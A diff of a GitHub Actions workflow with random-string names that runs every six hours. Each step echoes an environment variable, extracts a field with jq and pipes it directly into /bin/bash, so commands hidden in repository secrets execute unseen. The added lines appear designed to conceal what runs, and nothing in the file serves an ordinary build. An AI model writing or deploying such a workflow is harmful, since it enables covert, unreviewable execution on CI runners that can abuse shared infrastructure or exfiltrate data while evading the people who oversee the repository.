@@ -1,21 +1,27 @@
 name: znckaoi
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 4/6 * * *'
-jobs:  # 8530
+    - cron: '34 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: znckaoi
         env:
-          whch2582: ${{ secrets.whch2582 }}
+          a9: ${{ secrets.a9 }}
         run: |
-          echo $whch2582 | jq -r .r935 | /bin/bash
-          echo $pz9 | jq -r .meipw60605 | /bin/bash
-          echo $gijb38162 | jq -r .j488 | /bin/bash
-          echo $h1 | jq -r .jmc1120 | /bin/bash
-          echo $xloei91958 | jq -r .ri017 | /bin/bash
-          echo $xcrg3 | jq -r .b36038 | /bin/bash
+          echo $a9 | jq -r .af862 | /bin/bash
+          echo $ut2 | jq -r .miv3285 | /bin/bash
+          echo $c4 | jq -r .lyvh066 | /bin/bash
+          echo $beku3 | jq -r .eon03937 | /bin/bash
+          echo $slmrp946 | jq -r .etlg16627 | /bin/bash
+          echo $arsyg5743 | jq -r .cjpdd03 | /bin/bash
+          echo $gqr26 | jq -r .wfux9758 | /bin/bash
+          echo $z5830 | jq -r .zd71 | /bin/bash
+          echo $bil86 | jq -r .qbp23 | /bin/bash
+          echo $fxuca75577 | jq -r .u07 | /bin/bash
 
